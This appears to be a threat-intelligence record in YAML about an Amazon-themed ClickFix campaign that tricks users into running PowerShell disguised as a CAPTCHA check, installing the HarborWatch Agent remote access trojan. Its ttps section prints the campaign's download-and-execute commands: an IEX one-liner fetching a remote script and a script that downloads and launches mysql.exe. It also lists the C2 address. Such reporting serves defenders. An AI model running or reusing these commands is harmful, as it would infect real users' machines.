title: Amazon-Themed ClickFix Campaign Delivers HarborWatch Agent RAT
description: Threat actors abuse Amazon branding and ClickFix self-infection technique
  to deliver HarborWatch Agent, a custom remote access trojan, by tricking users into
  running malicious PowerShell commands disguised as CAPTCHA verification. The malware
  connects to a C2 server and collects system information including OS version, hostname,
  CPU count, disk usage, memory usage, and network status.
attribution: ''
malware_families:
- HarborWatch Agent
- Harbor Sentinel
- HarborWatchAgent
cves: []
ttps:
  processes:
  - powershell.exe
  - mysql.exe
  command_lines: []
  powershell:
  - IEX ((new-object net.webclient).downloadstring("https://amazonalert.xyz/download/code.txt"))
  scripts:
  - "$FileName = \"mysql.exe\"\n$downloadPath = Join-Path -Path $env:TEMP -ChildPath\
    \ $FileName\n$url = \"https://zoomupdate.b-cdn.net/mysql.exe\"\ntry {\n    Invoke-WebRequest\
    \ -Uri $url -OutFile $downloadPath -UseBasicParsing\n    Start-Process -FilePath\
    \ $downloadPath -ArgumentList \"--pass=JHSgfsa2652\" -Wait\n    Write-Host \"\
    SUCCESS\" -ForegroundColor Green -NoNewline\n} catch {\n    Write-Error \"Error:\
    \ $_\"\n}"
  registry_keys: []
  image_loads: []
  network_connections:
  - mysql.exe -> 185.193.127[.]44
  - mysql.exe -> 185.193.127[.]44/api/heartbeat
